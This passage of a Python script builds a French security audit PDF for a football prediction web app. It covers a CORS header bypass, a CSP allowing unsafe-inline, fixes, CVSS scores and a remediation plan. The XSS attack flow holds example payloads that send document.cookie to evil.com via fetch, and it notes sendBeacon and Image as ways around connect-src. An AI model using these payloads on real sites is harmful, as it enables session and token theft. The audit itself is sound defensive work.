    '<b>Exploitation :</b> L\'attaquant appelle les endpoints API comme s\'il etait l\'application native Capacitor. Combine avec V-01 (device_id en clair), l\'attaquant peut : lire les predictions de n\'importe quel utilisateur, creer des predictions frauduleuses, et potentiellement acceder aux endpoints admin si le bypass CORS est combine avec des credentials de session admin.',
]
for step in v02_steps:
    story.append(bullet(step))

story.append(Paragraph(
    '<b>Impact CVSS estime :</b> CVSS 3.1 Score 8.6 (High). Vecteur : AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N. '
    'L\'impact est eleve car le bypass CORS permet a un site tiers de se faire passer pour l\'application native, '
    'avec changement de scope (S:C) car d\'autres origins sont affectees. L\'interaction utilisateur (UI:R) est '
    'necessaire dans le scenario navigateur (la victime doit visiter evil.com), mais pas dans le scenario curl.',
    s_body
))

# 4.3 Plan de Correction
story.append(Paragraph('4.3 Plan de Correction', s_h2))

story.append(Paragraph(
    'La correction de V-02 repose sur le principe fondamental : <b>ne jamais faire confiance a un en-tete HTTP '
    'controlable par le client</b> pour des decisions de securite. L\'en-tete x-capacitor-request existe pour permettre '
    'aux requetes natives de l\'application Capacitor de fonctionner sans origine valide (les apps Capacitor Android '
    'envoient Origin: https://localhost). Cependant, cet en-tete doit etre combine avec d\'autres verifications pour '
    'ne pas constituer un bypass complet.',
    s_body
))

story.append(Paragraph('Strategie : Validation multi-facteur pour requetes natives', s_h3))
correction_items = [
    '<b>HMAC comme authentification primaire :</b> Les requetes de l\'application native doivent s\'authentifier via le token HMAC (Authorization: Device). Si le token est valide, la requete est autorisee independamment de l\'origine. Le bypass x-capacitor-request n\'est plus necessaire pour l\'authentification.',
    '<b>Origin validation renforcee :</b> Pour les requetes sans HMAC valide (utilisateurs non authentifies, endpoints publics), isOriginAllowed() doit verifier l\'origine uniquement via la whitelist. L\'en-tete x-capacitor-request ne doit plus retourner true directement mais servir de signal secondaire combine avec la verification de l\'origine.',
    '<b>CSRF token pour etat mutable :</b> Les requetes POST/PUT/DELETE doivent exiger un token CSRF (double-submit cookie pattern ou Synchronizer Token Pattern) independant de CORS. Meme si le bypass CORS est exploite, le token CSRF empeche les requetes forgees cross-origin.',
    '<b>Rate limiting par origine :</b> Le Edge middleware (middleware.js) doit differencier les limites de debit par origine. Les origines dans la whitelist ont des limites normales (30/min). Les origines inconnues ou les requetes avec x-capacitor-request mais sans HMAC valide ont des limites restrictives (5/min).',
    '<b>Suppression progressive :</b> Apres migration HMAC complete (HMAC_ONLY=true), l\'en-tete x-capacitor-request peut etre entierement ignore dans isOriginAllowed(). La valeur de retour de la ligne 19 devient false ou la ligne est supprimee.',
]
for item in correction_items:
    story.append(bullet(item))

story.append(code_block(
    '// Correction : isOriginAllowed() sans bypass aveugle\n'
    'export function isOriginAllowed(origin, reqHost, reqHeaders) {\n'
    '  // 1. Exact match against allowed list\n'
    '  if (ALLOWED_ORIGINS.includes(origin)) return true;\n'
    '\n'
    '  // 2. Same hostname as Vercel deployment\n'
    '  try {\n'
    '    const originHost = new URL(origin).hostname;\n'
    '    if (originHost === reqHost) return true;\n'
    '  } catch {}\n'
    '\n'
    '  // x-capacitor-request is NO LONGER a bypass.\n'
    '  // Native app auth goes through HMAC tokens.\n'
    '  return false;\n'
    '}'
))

# ═══════════════════════════════════════════════════════════════════
# 5. V-03
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('5. V-03 — CSP unsafe-inline Neutralise la Protection XSS', s_h1))

story.append(Paragraph(
    'La vulnerabilite V-03 reside dans la directive Content-Security-Policy definie dans <b>vercel.json</b>. '
    'La politique actuelle inclut <b>script-src \'self\' \'unsafe-inline\' https://cdn.jsdelivr.net</b>, '
    'ce qui desactive effectivement la protection XSS du navigateur. La directive unsafe-inline indique au navigateur '
    'qu\'il doit autoriser l\'execution de scripts inline (gestionnaires d\'evenements onclick, blocs script sans src, '
    'javascript: URIs), ce qui est exactement ce qu\'un attaquant XSS injecte dans la page. '
    'En presence de unsafe-inline, la CSP n\'apporte aucune protection contre les attaques XSS de type '
    'injection de scripts inline.',
    s_body
))

# 5.1 Fichiers
story.append(Paragraph('5.1 Fichiers Concernes', s_h2))

v03_files_data = [
    ['vercel.json', 'Ligne headers', 'CSP avec script-src \'self\' \'unsafe-inline\' + style-src \'unsafe-inline\''],
    ['index.html', 'Ligne 33-45', 'Script inline : window.addEventListener(\'load\', ...) + window.onerror'],
    ['vite.config.ts', 'Global', 'Vite hache deja les noms de fichiers JS (content hash)'],
]
story.append(make_table(
    ['Fichier', 'Ligne(s)', 'Impact'],
    v03_files_data,
    col_widths=[35*mm, 25*mm, 110*mm]
))
story.append(Paragraph('Tableau 4 : Fichiers affectes par V-03', s_caption))

story.append(code_block(
    '// vercel.json — CSP actuelle (VULNERABLE)\n'
    '"Content-Security-Policy":\n'
    '  "default-src \'self\'; "\n'
    '  "script-src \'self\' \'unsafe-inline\' https://cdn.jsdelivr.net; "  // <-- unsafe-inline!\n'
    '  "style-src \'self\' \'unsafe-inline\' https://cdn.jsdelivr.net; "   // <-- unsafe-inline!\n'
    '  "img-src \'self\' data: blob: https://lh3.googleusercontent.com; "\n'
    '  "font-src \'self\'; "\n'
    '  "connect-src \'self\' https://*.vercel.app; "\n'
    '  "frame-ancestors \'none\'; base-uri \'self\'; form-action \'self\'"'
))

# 5.2 Flux d'Attaque
story.append(Paragraph('5.2 Flux d\'Attaque', s_h2))

story.append(Paragraph('Scenario d\'attaque — XSS persistant via injection de script inline', s_attack_title))

v03_steps = [
    '<b>Point d\'injection :</b> L\'attaquant identifie un point d\'injection XSS dans l\'application. Les candidats incluent : les noms d\'equipes de football affiches sans escaping suffisant (les donnees viennent de l\'API externe sporty-tech.net), les messages d\'erreur affiches dynamiquement, ou les contenus utilisateur stockes en base de donnees et restitues sans sanitization adequate (la fonction sanitize() dans predictions.js ne supprime que les balises HTML, pas les attributs d\'evenements).',
    '<b>Construction du payload :</b> L\'attaquant construit un payload XSS qui injecte un bloc script inline. Par exemple : un nom d\'equipe malveillant "PSG&lt;script&gt;fetch(\'https://evil.com/steal?\' + document.cookie)&lt;/script&gt;" ou un attribut d\'evenement "PSG" onclick="fetch(\'https://evil.com?\'+document.cookie)". Avec unsafe-inline, le navigateur autorise l\'execution de ce script.',
    '<b>Execution :</b> Lorsqu\'un utilisateur consulte la page contenant le payload injecte, le navigateur execute le script inline. La CSP ne bloque pas l\'execution car unsafe-inline est present. Le script accede a document.cookie (tokens de session), localStorage (device_id, device_secret), ou effectue des requetes API en tant qu\'utilisateur.',
    '<b>Exfiltration :</b> Le script inline envoie les donnees volees a un serveur controle par l\'attaquant. La CSP inclut connect-src \'self\' https://*.vercel.app, mais le script inline peut utiliser navigator.sendBeacon() ou une Image src pour contourner connect-src (sendBeacon et Image ne sont pas soumis a connect-src).',
    '<b>Impact :</b> L\'attaquant vole le token de session utilisateur (Bearer token dans localStorage), le device_id et device_secret (IndexedDB/localStorage), et peut ensuite se faire passer pour la victime sur n\'importe quel endpoint API. L\'attaque est persistante si le payload XSS est stocke en base de donnees (noms d\'equipes modifies via API admin).',
]
for step in v03_steps:
    story.append(bullet(step))

story.append(Paragraph(
    '<b>Impact CVSS estime :</b> CVSS 3.1 Score 8.4 (High). Vecteur : AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L. '
    'L\'attaque requiert une interaction utilisateur (UI:R) pour consulter la page infectee. L\'impact sur la '
    'confidentialite et l\'integrite est maximal (C:H/I:H) car les tokens de session et secrets HMAC sont accessibles '
    'via JavaScript. L\'impact sur la disponibilite est limite (A:L) car l\'attaquant peut supprimer des donnees '
    'mais pas arreter le service.',
    s_body
))

# 5.3 Plan de Correction
story.append(Paragraph('5.3 Plan de Correction', s_h2))

story.append(Paragraph(
    'La correction de V-03 suit une approche progressive en trois etapes, car la suppression de unsafe-inline '
    'peut casser des fonctionnalites existantes (scripts inline dans index.html, attributs d\'evenements dans les '
    'composants React). Chaque etape reduit la surface d\'attaque sans regression fonctionnelle.',
    s_body
))

story.append(Paragraph('Etape 1 : Nonces CSP pour scripts inline (Phase C)', s_h3))
story.append(Paragraph(
    'Vercel Serverless Functions peuvent generer un nonce CSP par requete via le Edge middleware (middleware.js). '
    'Le middleware genere un nonce aleatoire (crypto.randomUUID() ou crypto.randomBytes(16).toString("base64")), '
    'l\'injecte dans l\'en-tete CSP (script-src \'self\' \'nonce-abc123\' https://cdn.jsdelivr.net) et l\'expose '
    'au HTML via un cookie ou un en-tete secondaire (X-CSP-Nonce). L\'application React lit le nonce et '
    'l\'applique aux elements script qui en ont besoin. Les scripts inline dans index.html sont deplaces '
    'vers un fichier JS externe (/src/bootstrap.js) charge avec le nonce.',
    s_body
))

story.append(code_block(
    '// middleware.js — Generation de nonce CSP\n'
    'export function middleware(request) {\n'
    '  const nonce = crypto.randomUUID().replace(/-/g, \'\');\n'
    '  const response = NextResponse.next();\n'
    '  response.headers.set(\'X-CSP-Nonce\', nonce);\n'
    '  // CSP with nonce instead of unsafe-inline:\n'
    '  response.headers.set(\'Content-Security-Policy\',\n'
    '    `script-src \'self\' \'nonce-${nonce}\' https://cdn.jsdelivr.net; ` +\n'
    '    `style-src \'self\' \'unsafe-inline\' https://cdn.jsdelivr.net; ...`\n'
    '  );\n'
    '  return response;\n'
    '}'
))

story.append(Paragraph('Etape 2 : Hashes CSP pour les scripts statiques', s_h3))
story.append(Paragraph(
    'Pour les scripts dont le contenu est statique et connu a l\'avance (scripts de bootstrap, service worker registration), '
    'calculer le hash SHA-256 du contenu et l\'ajouter a la directive script-src comme \'sha256-BASE64HASH\'. '
    'Cela elimine le besoin de nonce pour ces scripts specifiques. Vite genere deja des fichiers JS avec content hash '
    'dans le nom, ce qui signifie que script-src \'self\' couvre deja les bundles Vite. Seuls les scripts inline '
    'dans index.html (window.addEventListener, window.onerror) necessitent des hashes ou nonces.',
    s_body
))

story.append(Paragraph('Etape 3 : Suppression de style-src unsafe-inline', s_h3))
story.append(Paragraph(
    'La directive style-src \'unsafe-inline\' est moins critique que script-src \'unsafe-inline\' car les styles inline '
    'ne permettent pas l\'execution de code JavaScript. Cependant, elle peut etre exploitee pour des attaques de '
    'defacement ou de clickjacking CSS. La suppression suit le meme pattern : Vite genere deja les CSS avec content hash, '
    'donc style-src \'self\' couvre les styles de l\'application. Les styles inline dynamiques (React style={{}}) '
    'necessitent soit des nonces, soit une migration vers des classes CSS. Cette etape est de priorite plus basse '
    'et peut etre differree a la phase de refactoring (Phase O).',
    s_body
))

# ═══════════════════════════════════════════════════════════════════
# 6. MATRICE DE SEVERITE
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('6. Matrice de Severite et Priorisation', s_h1))

severity_data = [
    ['V-01', severity_badge('CRITIQUE'), '9.1',
     'Usurpation d\'identite appareil', 'Phase A (immediate)',
     'HMAC_ONLY feature flag'],
    ['V-02', severity_badge('CRITIQUE'), '8.6',
     'Contournement CORS', 'Phase A (immediate)',
     'Suppression bypass x-capacitor-request'],
    ['V-03', severity_badge('CRITIQUE'), '8.4',
     'CSP unsafe-inline', 'Phase C (apres A+B)',
     'Nonces CSP + hashes SHA-256'],
]
story.append(make_table(
    ['ID', 'Severite', 'CVSS', 'Description', 'Phase', 'Correction'],
    severity_data,
    col_widths=[15*mm, 20*mm, 14*mm, 40*mm, 30*mm, 46*mm]
))
story.append(Paragraph('Tableau 5 : Matrice de severite', s_caption))

story.append(Paragraph(
    'L\'ordre de remediation est dictte par la severite et les dependances entre vulnerabilites. '
    'V-01 et V-02 sont remediees en Phase A (securite) car elles constituent des vecteurs d\'attaque actifs '
    'exploitables immediatement. V-03 est remediee en Phase C (CSP) car elle necessite des modifications '
    'd\'infrastructure (middleware, index.html) qui dependent de la stabilisation des mecanismes d\'authentification '
    '(Phases A et B). Tenter de corriger la CSP avant l\'authentification expose l\'application a des regressions '
    'ou le legitime est bloque tandis que l\'attaquant contourne.',
    s_body
))

# ═══════════════════════════════════════════════════════════════════
# 7. STRATEGIE MIGRATION HMAC
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('7. Strategie de Migration HMAC', s_h1))

story.append(Paragraph(
    'La migration du schema d\'authentification (x-device-id en clair vers HMAC-SHA256) est l\'element central '
    'de la remediation de V-01. Cette section detaille la strategie de migration qui garantit la continuite de service '
    'pendant la transition tout en minimisant la fenetre de vulnerabilite.',
    s_body
))

migration_data = [
    ['Semaine 0', 'Deploiement APK mis a jour', 'Le nouvel APK utilise getAuthHeaders() avec token HMAC. L\'ancien APK continue d\'envoyer x-device-id en clair.'],
    ['Semaine 0-1', 'Monitoring des logs fallback', 'Chaque utilisation du fallback console.warn est logguee. Dashboard de migration : ratio HMAC/fallback.'],
    ['Semaine 1-2', 'Restriction progressive', 'HMAC_ONLY=false mais DELETE interdit via fallback. Rate limit plus strict pour fallback (5/min vs 30/min HMAC).'],
    ['Semaine 2', 'Decision : HMAC_ONLY=true', 'Si le taux de fallback < 1%, activer HMAC_ONLY=true. Sinon, investiger les sources residuelles.'],
    ['Semaine 3', 'Suppression du code fallback', 'Supprimer les lignes 199-222 de auth.js. Tests de non-regression obligatoires.'],
]
story.append(make_table(
    ['Periode', 'Action', 'Details'],
    migration_data,
    col_widths=[25*mm, 40*mm, 105*mm]
))
story.append(Paragraph('Tableau 6 : Calendrier de migration HMAC', s_caption))

story.append(Paragraph(
    '<b>Garantie de securite pendant la migration :</b> Meme pendant la periode ou le fallback est actif, '
    'la surface d\'attaque est reduite par les mesures suivantes : (a) le fallback ne s\'applique qu\'aux methodes '
    'non-destructives (GET et POST de creation, pas DELETE), (b) le rate limiting est plus strict pour les requetes '
    'fallback (5 requetes/minute contre 30 pour HMAC), (c) chaque utilisation du fallback est logguee avec '
    'l\'IP source et le device_id, permettant la detection d\'abus, (d) les endpoints sensibles (admin, premium-activate '
    'avec code d\'acces) exigent toujours le token HMAC ou le Bearer token utilisateur, independamment du fallback.',
    s_body
))

# ═══════════════════════════════════════════════════════════════════
# 8. ORDRE D'EXECUTION
# ═══════════════════════════════════════════════════════════════════
story.append(Paragraph('8. Ordre d\'Execution des Phases (A-T)', s_h1))

story.append(Paragraph(
    'Le plan de remediation complet suit un ordre strict de 20 phases (A a T). Les trois premieres phases '
    'concernent directement les vulnerabilites audittees dans ce document. Les phases suivantes abordent '
    'les problemes de modele de prediction (coefficients arbitraires, absence de backtesting, calibration) '
    'et les ameliorations d\'infrastructure (rate limiting persistant, CI/CD, couverture de tests).',
    s_body
))

phases_data = [
    ['A', 'Securite (V-01 + V-02)', 'CRITIQUE', 'HMAC_ONLY flag, suppression CORS bypass'],
    ['B', 'Tests Securite', 'CRITIQUE', 'Tests automatises pour requireAuth, isOriginAllowed, CSP'],
    ['C', 'CSP (V-03)', 'CRITIQUE', 'Nonces CSP, hashes SHA-256, suppression unsafe-inline'],
    ['D', 'Tests Securite post-CSP', 'HAUTE', 'Validation que la CSP restrictive ne casse rien'],
    ['E', 'Rate Limiting persistant', 'HAUTE', 'Migration vers Upstash Redis (serverless-safe)'],
    ['F', 'Framework Backtesting', 'HAUTE', 'Infrastructure de test sur donnees historiques'],
    ['G', 'Baselines empiriques', 'HAUTE', 'Comparaison avec odds implicites, random, always-home'],
    ['H', 'Metrics (Brier, Log Loss)', 'MODEREE', 'Implementation des metriques de calibration'],
    ['I', 'Calibration', 'MODEREE', 'Platt scaling / isotonic regression sur predictions'],
    ['J', 'Audit coefficients', 'MODEREE', 'Validation empirique des 17 coefficients'],
    ['K', 'AI_WEIGHT audit', 'MODEREE', 'Justification du poids 35% de l\'IA'],
    ['L', 'VIRTUAL_AVG_GOALS audit', 'MODEREE', 'Validation du 1.3 buts/match moyen'],
    ['M', 'Distribution Poisson', 'BASSE', 'Test de Poisson vs distribution reelle des buts'],
    ['N', 'Trap Detector', 'BASSE', 'Detection des predictions pieges (value traps)'],
    ['O', 'Refactoring', 'BASSE', 'Separation prediction engine / API / DB'],
    ['P', 'Versioning modeles', 'BASSE', 'Schema de versioning pour coefficients'],
    ['Q', 'Couverture tests', 'BASSE', 'Objectif 80% coverage'],
    ['R', 'Non-regression', 'BASSE', 'Tests de non-regression pour chaque changement de coeff'],
    ['S', 'CI/CD', 'INFO', 'Pipeline GitHub Actions avec gates de securite'],
    ['T', 'Rapport final', 'INFO', 'Document de synthese des 20 phases'],
]
story.append(make_table(
    ['Phase', 'Nom', 'Priorite', 'Description'],
    phases_data,
    col_widths=[14*mm, 40*mm, 20*mm, 96*mm]
))
story.append(Paragraph('Tableau 7 : Plan de remediation en 20 phases', s_caption))

story.append(Paragraph(
    '<b>Principe absolu :</b> Aucune modification du moteur de prediction (phases F a M) ne doit etre effectuee '
    'avant que les phases A a E ne soient entierement completees et validees. Le moteur de prediction est le coeur '
    'metier de l\'application, et toute modification effectuee sur une base non securisee risque d\'introduire des '
    'regressions ou des vulnerabilites supplementaires. L\'ordre est non-negociable.',
    s_body
))

# ── Build PDF ──────────────────────────────────────────────────────
doc.build(story)
print(f'PDF generated: {OUTPUT_PATH}')

# Add metadata
import subprocess
subprocess.run([
    'python3', '/home/z/my-project/skills/pdf/scripts/pdf.py',
    'meta.brand', OUTPUT_PATH
], capture_output=True)
print('Metadata branded.')
